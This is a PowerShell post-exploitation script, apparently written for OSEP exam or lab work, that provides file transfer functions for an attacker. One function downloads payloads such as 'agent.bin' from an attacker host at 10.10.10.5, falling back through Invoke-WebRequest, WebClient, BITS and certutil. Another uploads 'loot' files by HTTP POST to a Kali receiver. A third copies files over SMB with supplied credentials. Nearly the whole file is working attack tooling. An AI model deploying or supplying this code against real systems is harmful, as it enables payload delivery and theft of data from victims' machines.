# OSEP - File Transfer (all methods, auto-fallback)
# . .\file_transfer.ps1
# Get-RemoteFile -url http://10.10.10.5/agent.bin -out C:\Windows\Temp\a.bin
# Send-File -path C:\Windows\Temp\loot.txt -url http://10.10.10.5:8080/upload

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][Transfer][$l] $m" -EA SilentlyContinue}catch{}}

# Download with auto-fallback: IWR → WebClient → BitsTransfer → certutil
function Get-RemoteFile {
    param(
        [Parameter(Mandatory)][string]$url,
        [Parameter(Mandatory)][string]$out
    )
    wl "Downloading $url → $out"

    # Method 1: Invoke-WebRequest
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -EA Stop
        if (Test-Path $out) { wl "IWR OK"; Write-Host "[+] Downloaded (IWR): $out"; return }
    } catch { wl "IWR failed: $_" "WARN" }

    # Method 2: WebClient
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile($url, $out)
        if (Test-Path $out) { wl "WebClient OK"; Write-Host "[+] Downloaded (WebClient): $out"; return }
    } catch { wl "WebClient failed: $_" "WARN" }

    # Method 3: BITS (runs as background job — blocked on some systems)
    try {
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if (Test-Path $out) { wl "BITS OK"; Write-Host "[+] Downloaded (BITS): $out"; return }
    } catch { wl "BITS failed: $_" "WARN" }

    # Method 4: certutil -urlcache (always available, but leaves artifacts)
    try {
        $r = cmd /c "certutil -urlcache -split -f $url $out" 2>&1
        if (Test-Path $out) { wl "certutil OK: $r"; Write-Host "[+] Downloaded (certutil): $out"; return }
    } catch { wl "certutil failed: $_" "WARN" }

    wl "All download methods failed for $url" "ERROR"
    Write-Host "[-] All download methods failed"
}

# Upload file via HTTP POST (needs simple Python receiver on Kali)
function Send-File {
    param(
        [Parameter(Mandatory)][string]$path,
        [Parameter(Mandatory)][string]$url
    )
    wl "Uploading $path → $url"

    if (-not (Test-Path $path)) { wl "File not found: $path" "ERROR"; Write-Host "[-] File not found: $path"; return }

    try {
        $bytes = [IO.File]::ReadAllBytes($path)
        $wc    = New-Object Net.WebClient
        $wc.UploadData($url, "POST", $bytes) | Out-Null
        wl "Upload OK ($($bytes.Length) bytes)"
        Write-Host "[+] Uploaded $path ($($bytes.Length) bytes)"
    } catch {
        wl "Upload failed: $_" "ERROR"
        Write-Host "[-] Upload failed: $_"
    }
}

# Quick SMB copy (needs creds or existing auth)
function Copy-SMB {
    param(
        [Parameter(Mandatory)][string]$src,
        [Parameter(Mandatory)][string]$dst,
        [string]$user,
        [string]$pass
    )
    if ($user -and $pass) {
        cmd /c "net use $(Split-Path $dst) /user:$user $pass" 2>&1 | Out-Null
    }
    try {
        Copy-Item $src $dst -Force -EA Stop
        wl "SMB copy OK: $src → $dst"
        Write-Host "[+] Copied: $dst"
    } catch {
        wl "SMB copy failed: $_" "ERROR"
        Write-Host "[-] SMB copy failed: $_"
    }
}

Write-Host "[*] file_transfer.ps1 loaded. Functions: Get-RemoteFile, Send-File, Copy-SMB"
Write-Host "[*] Kali receiver: python3 -m http.server 80"
Write-Host "[*] Kali upload receiver: python3 -c `"import http.server,socketserver; ...`"  (or use uploadserver pip pkg)"
